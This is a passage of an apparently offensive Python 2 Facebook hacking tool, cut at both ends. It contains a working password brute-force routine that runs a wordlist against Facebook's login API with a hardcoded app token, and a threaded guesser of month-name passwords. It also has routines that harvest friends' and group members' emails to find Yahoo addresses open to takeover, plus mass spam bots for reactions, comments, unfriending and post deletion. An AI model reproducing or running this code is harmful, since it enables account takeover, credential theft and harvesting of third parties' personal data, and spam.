                                                                                                                                         a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+fb_token)
                                                                                                                                         b = json.loads(a.text)
                                                                                                                                         pass8 = "january","february","march","april","may","june","july","august","september","november","december"
                                                                                                                                         data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%252525257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                         q = json.load(data)
                                                                                                                                         if 'access_token' in q:
                                                                                                                                                 x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                                                                                                                                 z = json.loads(x.text)
                                                                                                                                                 print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass8+" =>"+z['name'])
                                                                                                                                                 oks.append(user+pass8)
                                                                                                                                         else:
                                                                                                                                                 if 'www.facebook.com' in q["error_msg"]:
                                                                                                                                                         check_it = open("out/output.txt", "a")
                                                                                                                                                         check_it.write(user+"|"+pass8+"\n")
                                                                                                                                                         check_it.close()
                                                                                                                                                         checkpoint.append(user+pass8)

		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal OK/CP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(checkpoint))
	print("\033[1;91m[+] \033[1;92mCP File saved \033[1;91m: \033[1;97mout/output.txt")
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	super()
######################################################

##### BRUTE FORCE #####
def brute():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	try:
		email = raw_input("\033[1;91m[+] \033[1;92mID\033[1;97m/\033[1;92mEmail\033[1;97m/\033[1;92mHp \033[1;97mTarget \033[1;91m:\033[1;97m ")
		passw = raw_input("\033[1;91m[+] \033[1;92mWordlist \033[1;97mext(list.txt) \033[1;91m: \033[1;97m")
		total = open(passw,"r")
		total = total.readlines()
		print 42*"\033[1;97m═"
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTarget \033[1;91m:\033[1;97m "+email
		print "\033[1;91m[+] \033[1;92mTotal\033[1;96m "+str(len(total))+" \033[1;92mPassword"
		mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		sandi = open(passw,"r")
		for pw in sandi:
			try:
				pw = pw.replace("\n","")
				sys.stdout.write("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;91m: \033[1;97m"+pw)
				sys.stdout.flush()
				data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(email)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				mpsh = json.loads(data.text)
				if 'access_token' in mpsh:
					dapat = open("Brute.txt", "w")
					dapat.write(email+" | "+pw+"\n")
					dapat.close()
					print "\n\033[1;91m[+] \033[1;92mFound"
					print 42*"\033[1;97m═"
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
					exit()
				elif 'www.facebook.com' in mpsh["error_msg"]:
					ceks = open("Brutecheckpoint.txt", "w")
					ceks.write(email+" | "+pw+"\n")
					ceks.close()
					print "\n\033[1;91m[+] \033[1;92mFound"
					print 42*"\033[1;97m═"
					print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
					exit()
			except requests.exceptions.ConnectionError:
				print"\033[1;91m[!] Connection Error"
				time.sleep(0.01)
	except IOError:
		print ("\033[1;91m[!] File not found")
		wordlst()
def wordlst():
	why = raw_input("\033[1;91m[?] \033[1;92mCreate wordlist ? \033[1;92m[y/n]\033[1;91m:\033[1;97m ")
	if why =="":
		print "\033[1;91m[!] Wrong"
		wordlst()
	elif why =="y":
		wordlist()
	elif why =="Y":
		wordlist()
	elif why =="n":
		menu_hack()
	elif why =="N":
		menu_hack()
	else:
		print "\033[1;91m[!] Wrong"
		wordlst()

##### YAHOO CHECKER #####
#---------------------------------------------------#
def menu_yahoo():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m With list friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Clone from friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Clone from member group"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Using file"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	choose_yahoo()
#----choices
def choose_yahoo():
	go = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if go =="":
		print "\033[1;91m[!] Wrong"
		choose_yahoo()
	elif go =="1":
		yahoofriends()
	elif go =="2":
		yahoofromfriends()
	elif go =="3":
		yahoomember()
	elif go =="4":
		yahoolist()
	elif go =="0":
		menu_hack()
	else:
		print "\033[1;91m[!] Wrong"
		choose_yahoo()

##### LIST FRIEND #####
def yahoofriends():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jcsb = 0
	mkdir('\033[1;91m[✺] \033[1;92mGetting email friend \033[1;97m...')
	friends = requests.get('https://graph.facebook.com/me/friends?access_token='+fb_token)
	mitchy = json.loads(friends.text)
	save = open('out/MailVuln.txt','w')
	mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for w in mitchy['data']:
		jcsb +=1
		mpsh.append(jcsb)
		id = w['id']
		fb_name = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+fb_token)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				click = br.submit().read()
				seat = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					picks = seat.search(click).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in picks:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+fb_name)
					sucessful.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(sucessful))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/MailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()

##### CLONE FROM FRIEND #####
def yahoofromfriends():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jcsb = 0
	idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
	try:
		seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
		op = json.loads(seat.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
	except KeyError:
		print"\033[1;91m[!] Friend not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_yahoo()
	mkdir('\033[1;91m[✺] \033[1;92mGetting email from friend \033[1;97m...')
	friends = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+fb_token)
	mitchy = json.loads(friends.text)
	save = open('out/FriendMailVuln.txt','w')
	mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for w in mitchy['data']:
		jcsb +=1
		mpsh.append(jcsb)
		id = w['id']
		fb_name = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+fb_token)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				click = br.submit().read()
				seat = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					picks = seat.search(click).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in picks:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+fb_name)
					sucessful.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(sucessful))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/FriendMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()

##### YAHOO MEMBER #####
def yahoomember():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jcsb = 0
	id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_yahoo()
	mkdir('\033[1;91m[✺] \033[1;92mGetting email from group \033[1;97m...')
	friends = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+fb_token)
	mitchy = json.loads(friends.text)
	save = open('out/groupMailVuln.txt','w')
	mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
        print 42*"\033[1;97m═"
	for w in mitchy['data']:
		jcsb +=1
		mpsh.append(jcsb)
		id = w['id']
		fb_name = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+fb_token)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				click = br.submit().read()
				seat = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					picks = seat.search(click).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in picks:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+fb_name)
					sucessful.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(sucessful))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/groupMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()

##### YAHOO FILE #####
def yahoolist():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	files = raw_input("\033[1;91m[+] \033[1;92mFile path \033[1;91m: \033[1;97m")
	try:
		total = open(files,"r")
		mail = total.readlines()
	except IOError:
		print"\033[1;91m[!] File not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_yahoo()
	mpsh = []
	jcsb = 0
	mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	save = open('out/FileMailVuln.txt','w')
	print 42*"\033[1;97m═"
	mail = open(files,"r").readlines()
	for pw in mail:
		mail = pw.replace("\n","")
		jcsb +=1
		mpsh.append(jcsb)
		yahoo = re.compile(r'@.*')
		otw = yahoo.search(mail).group()
		if 'yahoo.com' in otw:
			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			br._factory.is_html = True
			br.select_form(nr=0)
			br["username"] = mail
			click = br.submit().read()
			seat = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
			try:
			        picks = seat.search(click).group()
			except:
			        continue
			if '"messages.ERROR_INVALID_USERNAME">' in picks:
				save.write(mail + '\n')
				print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail)
				sucessful.append(mail)
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(sucessful))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/FileMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()



##### MENU BOT #####
#----------------------------------------#
def menu_bot():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Bot Reactions Target Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Bot Reactions group Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m BOT COMMENT Target Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m BOT COMMENT group Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Mass delete Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Mass accept friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Mass delete friend"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	choose_bot()
#////////////
def choose_bot():
	bots = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if bots =="":
		print "\033[1;91m[!] Wrong input"
		choose_bot()
	elif bots =="1":
		menu_react()
	elif bots =="2":
		group_react()
	elif bots =="3":
		bot_comment()
	elif bots =="4":
		group_comment()
	elif bots =="5":
		deletepost()
	elif bots =="6":
		accept()
	elif bots =="7":
		unfriend()
	elif bots =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		choose_bot()

##### MENU REACT #####
def menu_react():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print ("\033[1;97m║--\033[1;91m> \033[1;92m1. \033[1;97mLike")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m2. \033[1;97mLove")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m3. \033[1;97mWow")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m4. \033[1;97mHaha")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m5. \033[1;97mSadBoy")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m6. \033[1;97mAngry")
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	choose_reaction()
#//////////////
def choose_reaction():
	global tipe
	action = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if action =="":
		print "\033[1;91m[!] Wrong input"
		choose_reaction()
	elif action =="1":
		tipe = "LIKE"
		react()
	elif action =="2":
		tipe = "LOVE"
		react()
	elif action =="3":
		tipe = "WOW"
		react()
	elif action =="4":
		tipe = "HAHA"
		react()
	elif action =="5":
		tipe = "SAD"
		react()
	elif action =="6":
		tipe = "ANGRY"
		react()
	elif action =="0":
		menu_bot()
	else:
		print "\033[1;91m[!] Wrong input"
		choose_reaction()
#####NEXT
def react():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	ide = raw_input('\033[1;91m[+] \033[1;92mInput ID Target \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	try:
		oh = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+fb_token)
		ah = json.loads(oh.text)
		mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for a in ah['feed']['data']:
			y = a['id']
			reaction.append(y)
			requests.post("https://graph.facebook.com/"+y+"/reactions?type="+tipe+"&access_token="+fb_token)
			print '\033[1;92m[\033[1;97m'+y[:10].replace('\n',' ')+'... \033[1;92m] \033[1;97m'+tipe
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(reaction))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] ID not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()

##### BOT REACT group #####
def group_react():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print ("\033[1;97m║--\033[1;91m> \033[1;92m1. \033[1;97mLike")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m2. \033[1;97mLove")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m3. \033[1;97mWow")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m4. \033[1;97mHaha")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m5. \033[1;97mSadBoy")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m6. \033[1;97mAngry")
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	choosing_reaction()
#//////////////
def choosing_reaction():
	global tipe
	action = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if action =="":
		print "\033[1;91m[!] Wrong input"
		choosing_reaction()
	elif action =="1":
		tipe = "LIKE"
		reactg()
	elif action =="2":
		tipe = "LOVE"
		reactg()
	elif action =="3":
		tipe = "WOW"
		reactg()
	elif action =="4":
		tipe = "HAHA"
		reactg()
	elif action =="5":
		tipe = "SAD"
		reactg()
	elif action =="6":
		tipe = "ANGRY"
		reactg()
	elif action =="0":
		menu_bot()
	else:
		print "\033[1;91m[!] Wrong input"
		choosing_reaction()
#####NEXT
def reactg():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	ide = raw_input('\033[1;91m[+] \033[1;92mInput ID Group \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+fb_token)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		group_react()
	try:
		oh = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+fb_token)
		ah = json.loads(oh.text)
		mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for a in ah['feed']['data']:
			y = a['id']
			reactiongroup.append(y)
			requests.post("https://graph.facebook.com/"+y+"/reactions?type="+tipe+"&access_token="+fb_token)
			print '\033[1;92m[\033[1;97m'+y[:10].replace('\n',' ')+'... \033[1;92m] \033[1;97m'+tipe
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(reactiongroup))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] ID not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()

##### BOT COMMENT #####
def bot_comment():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;91m[!] \033[1;92mUse \033[1;97m'<>' \033[1;92mfor new lines"
	ide = raw_input('\033[1;91m[+] \033[1;92mID Target \033[1;91m:\033[1;97m ')
	km = raw_input('\033[1;91m[+] \033[1;92mComment \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	km=km.replace('<>','\n')
	try:
		p = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+fb_token)
		a = json.loads(p.text)
		mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for s in a['feed']['data']:
			f = s['id']
			comment.append(f)
			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+fb_token)
			print '\033[1;92m[\033[1;97m'+km[:10].replace('\n',' ')+'... \033[1;92m]'
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(comment))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] ID not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()

##### BOT COMMENT group #####
def group_comment():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;91m[!] \033[1;92mUse \033[1;97m'<>' \033[1;92mfor new lines"
	ide = raw_input('\033[1;91m[+] \033[1;92mID Group  \033[1;91m:\033[1;97m ')
	km = raw_input('\033[1;91m[+] \033[1;92mComment \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	km=km.replace('<>','\n')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+fb_token)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	try:
		p = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+fb_token)
		a = json.loads(p.text)
		mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for s in a['feed']['data']:
			f = s['id']
			group_comment.append(f)
			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+fb_token)
			print '\033[1;92m[\033[1;97m'+km[:10].replace('\n',' ')+'... \033[1;92m]'
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(group_comment))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] Error"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()

##### POST #####
def deletepost():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
		nam = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
		lol = json.loads(nam.text)
		fb_name = lol['name']
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print("\033[1;91m[+] \033[1;92mFrom \033[1;91m: \033[1;97m%s"%fb_name)
	mkdir("\033[1;91m[+] \033[1;92mStart\033[1;97m ...")
	print 42*"\033[1;97m═"
	asu = requests.get('https://graph.facebook.com/me/feed?access_token='+fb_token)
	asus = json.loads(asu.text)
	for p in asus['data']:
		id = p['id']
		piro = 0
		url = requests.get('https://graph.facebook.com/'+id+'?method=delete&access_token='+fb_token)
		ok = json.loads(url.text)
		try:
			error = ok['error']['message']
			print '\033[1;91m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;91m] \033[1;95mFailed'
		except TypeError:
			print '\033[1;92m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;92m] \033[1;96mDeleted'
			piro += 1
		except requests.exceptions.ConnectionError:
			print"\033[1;91m[!] Connection Error"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu_bot()
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()

##### ACCEPT FRIEND #####
def accept():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+fb_token)
	friends = json.loads(r.text)
	if '[]' in str(friends['data']):
		print"\033[1;91m[!] No friend request"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for i in friends['data']:
		gas = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+fb_token)
		a = json.loads(gas.text)
		if 'error' in str(a):
			print "\033[1;97m[ \033[1;91mFailed\033[1;97m ] "+i['from']['name']
		else:
			print "\033[1;97m[ \033[1;92mAccept\033[1;97m ] "+i['from']['name']
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()

##### UNFRIEND ####
def unfriend():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print "\033[1;97mStop \033[1;91mCTRL+C"
	print 42*"\033[1;97m═"
	try:
		picks = requests.get('https://graph.facebook.com/me/friends?access_token='+fb_token)
		tryy = json.loads(picks.text)
		for i in tryy['data']:
			fb_name = i['name']
			id = i['id']
			requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+fb_token)
			print "\033[1;97m[\033[1;92m Deleted \033[1;97m] "+fb_name
	except IndexError: pass
	except KeyboardInterrupt:
		print "\033[1;91m[!] Stopped"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	print"\n\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()

#### POSTING#####
#                                    #
####POST MENU#####
def func():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Create Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Create Wordlist"
